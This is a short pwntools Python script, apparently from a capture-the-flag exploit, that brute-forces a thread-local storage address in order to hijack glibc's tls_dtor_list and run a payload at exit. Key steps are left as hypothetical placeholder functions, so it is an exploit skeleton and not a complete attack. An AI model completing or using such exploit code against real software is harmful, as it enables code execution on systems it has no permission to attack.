from pwn import *

# Base TLS address from libc
tls_base = libc.address  # Example: 0x7f7935000000
tls_offset = 0x740       # Offset within the TLS
tls_range = range(0x000, 0x1000)  # Bruteforce range for 'xyz'

# Function to test an address
def test_tls_address(xyz):
    tls = tls_base | (xyz << 12) | tls_offset  # Construct address
    log.info(f"Testing TLS address: {hex(tls)}")
    
    try:
        # Try to hijack the tls_dtor_list
        # Replace this with actual logic to set fsbase and trigger the hijack
        set_tls_base(tls)  # Hypothetical function
        trigger_exit()     # Trigger the destructor to test the payload

        # Check if the payload executes
        result = check_payload_execution()  # Define success condition
        if result:
            log.success(f"Found valid TLS address: {hex(tls)}")
            return tls
    except:
        # Ignore errors for invalid addresses
        pass
    
    return None

# Bruteforce loop
for xyz in tls_range:
    tls_address = test_tls_address(xyz)
    if tls_address:
        break
